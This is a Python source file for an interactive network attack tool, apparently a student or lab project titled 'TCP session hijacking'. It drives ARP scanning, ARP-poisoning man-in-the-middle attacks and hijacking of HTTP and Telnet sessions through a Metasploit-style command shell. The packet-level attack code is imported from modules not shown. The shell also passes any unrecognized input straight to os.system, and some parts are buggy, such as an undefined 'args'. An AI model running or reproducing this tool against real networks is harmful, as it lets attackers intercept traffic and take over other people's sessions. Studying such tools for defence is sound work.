import os
from scapy.all import *
from sys import exit

from arp_poisoning import *
from tcp_hijacking import *
import globals


ASCII_ART = """
 ____    __                                 __         
/\  _`\ /\ \      __    __                 /\ \        
\ \ \L\ \ \ \___ /\_\  /\_\     __      ___\ \ \/'\    
 \ \ ,__/\ \  _ `\/\ \ \/\ \  /'__`\   /'___\ \ , <    
  \ \ \/  \ \ \ \ \ \ \ \ \ \/\ \L\.\_/\ \__/\ \ \\\\`\  
   \ \_\   \ \_\ \_\ \_\_\ \ \ \__/.\_\ \____\\\\ \_\ \_\\
    \/_/    \/_/\/_/\/_/\ \_\ \/__/\/_/\/____/ \/_/\/_/
                       \ \____/                        
                        \/___/       
"""


class Attack:
    def __init__(self, iface):
        self.iface = iface
        self.ip = get_if_addr(self.iface)
        self.mac = get_if_hwaddr(self.iface)


class ArpScan(Attack):
    def __init__(self, rhosts, iface):
        self.rhosts = rhosts
        super().__init__(iface)

    def __call__(self):
        print(f"[+] Scanning {self.rhosts}...")
        result = arp_scan(self.rhosts, self.iface)
        ip_to_MAC = {}

        for mapping in result:
            print(f"\t{mapping['IP']} => {mapping['MAC']}")
            ip_to_MAC[mapping['IP']] = mapping['MAC']

    @staticmethod
    def get_params():
        return {'RHOSTS': ''}


class ArpPoisoning(Attack):

    def __init__(self, target, gateway, iface):
        self.target = target
        self.gateway = gateway
        super().__init__(iface)

    def __call__(self):
        
        print(f"[+] Determining target and gateway MAC address.")

        result = arp_scan(self.target, self.iface)
        if not result:
            print("\tCannot determine target MAC address. Are you sure the IP is correct?")
            exit(1)
        else:
            targetMAC = result[0]['MAC']

        result = arp_scan(self.gateway, self.iface)
        if not result:
            print("\tCannot determine gateway MAC address. Are you sure the IP is correct?")
            exit(1)
        else:
            gatewayMAC = result[0]['MAC']

        # Define packet forwarding source and destination
        globals.GATEWAY_MAC = gatewayMAC
        globals._SRC_DST = {
            gatewayMAC: targetMAC,
            targetMAC: gatewayMAC,
        }

        print(f"[+] Performing ARP poisoning MITM.")
        filter = f"ip and (ether src {targetMAC} or ether src {gatewayMAC})"
        arp_mitm(self.target, self.gateway, targetMAC, gatewayMAC, globals.MY_MAC, sniff_parser, filter, self.iface)

    @staticmethod
    def get_params():
        return {'TARGET': '', 'GATEWAY': ''}


class SessionHijacking(Attack):
    def __init__(self, target, gateway, proto, iface):
        self.target = target
        self.gateway = gateway
        self.proto = proto
        super().__init__(iface)

    def __call__(self):

        print(f"[+] Determining target and gateway MAC address.")

        result = arp_scan(self.target, self.iface)
        if not result:
            print("\tCannot determine target MAC address. Are you sure the IP is correct?")
            exit(1)
        else:
            targetMAC = result[0]['MAC']

        result = arp_scan(self.gateway, self.iface)
        if not result:
            print("\tCannot determine gateway MAC address. Are you sure the IP is correct?")
            exit(1)
        else:
            gatewayMAC = result[0]['MAC']

        # Define packet forwarding source and destination
        globals.GATEWAY_MAC = gatewayMAC
        globals._SRC_DST = {
            gatewayMAC: targetMAC,
            targetMAC: gatewayMAC,
        }

        print(f"[+] Performing ARP poisoning MITM.")

        if self.proto == 'http':
            globals.PROTO = 'http'
            filter = f"ip and tcp port 80 and ether src {targetMAC}"

        elif self.proto == 'telnet':
            globals.PROTO = 'telnet'
            globals.CMD = args.cmd
            filter = f"ip and tcp port 23 and ether src {gatewayMAC}"

        arp_mitm(self.target, self.gateway, targetMAC, gatewayMAC, globals.MY_MAC, hijack, filter, self.iface)

    @staticmethod
    def get_params():
        return {'TARGET': '', 'GATEWAY': '', 'PROTO': ''}


class CommandHandler:
    def __init__(self):
        self.iface = conf.iface
        self.attack = 'DISCOVER'
        self.attack_params = ArpScan.get_params()
    
    def parse_cmd(self, cmd):
        """
        Parse the user command.
        Returns True if quit, False otherwise.
        """

        if cmd.startswith("SET"):
            data = cmd.split()

            if len(data) != 3:
                raise ValueError("Expected SET <key> <value>")
            
            key, value = data[1:]

            if key.lower() == 'iface':
                self.iface = value
                print(f"IFACE => {value}")

                globals.IFACE = self.iface
                globals.MY_MAC = get_if_hwaddr(IFACE)
                globals.MY_IP = get_if_addr(IFACE)

            elif key.lower() == 'attack':
                attack = value.lower()
                if attack == 'discover':
                    self.attack = 'DISCOVER'
                    self.attack_params = ArpScan.get_params()
                    print("ATTACK => DISCOVER")
                
                elif attack == 'mitm':
                    self.attack = 'MITM'
                    self.attack_params = ArpPoisoning.get_params()
                    print("ATTACK => MITM")
                
                elif attack == 'hijack':
                    self.attack = 'HIJACK'
                    self.attack_params = SessionHijacking.get_params()
                    print("ATTACK => HIJACK")

                else:
                    raise ValueError(f"Unrecognized attack {attack}")
            
            elif key.upper() in self.attack_params:
                self.attack_params[key.upper()] = value
                print(f"{key.upper()} => {value}")
            
            else:
                raise ValueError(f"Unrecognized parameter {key}")

        elif cmd == 'SHOW OPTIONS':

            print("\nBasic Parameters:\n")
            print(f"\tIFACE => {self.iface}")
            print(f"\tATTACK => {self.attack}")

            print("\nAttack Parameters:\n")
            for param in self.attack_params:
                print(f"\t{param} => {self.attack_params[param]}")
            print()
        
        elif cmd == 'EXPLOIT' or cmd == 'RUN':
            if self.attack == 'DISCOVER':
                attack = ArpScan(
                    self.attack_params['RHOSTS'], 
                    self.iface
                )
            
            elif self.attack == 'MITM':
                attack = ArpPoisoning(
                    self.attack_params['TARGET'], 
                    self.attack_params['GATEWAY'],
                    self.iface
                )
            
            elif self.attack == 'HIJACK':
                attack = SessionHijacking(
                    self.attack_params['TARGET'],
                    self.attack_params['GATEWAY'],
                    self.attack_params['PROTO'],
                    self.iface
                )

            try:
                attack()
            except KeyboardInterrupt:
                print("Detected keyboard interrupt, ending attack.")

        elif cmd == 'QUIT':
            return True
        
        else:
            # Allow system commands
            print(os.system(cmd))

        return False

def main():

    globals.IFACE = conf.iface
    globals.MY_MAC = get_if_hwaddr(conf.iface)
    globals.MY_IP = get_if_addr(conf.iface)

    print(ASCII_ART)
    print("{:^55}".format("TCP SESSION HIJACKING"))
    print("{:^55}".format("Attacking and Defending HTTP and Telnet Sessions"))
    print("\n{:^55}\n".format("Please use this tool responsibly!"))

    cmd_handler = CommandHandler()

    while True:
        try:
            cmd_handler.parse_cmd(input('> '))

        except KeyboardInterrupt:
            print("Bye!")
            break

        except ValueError as e:
            print(e)

if __name__ == '__main__':
    main()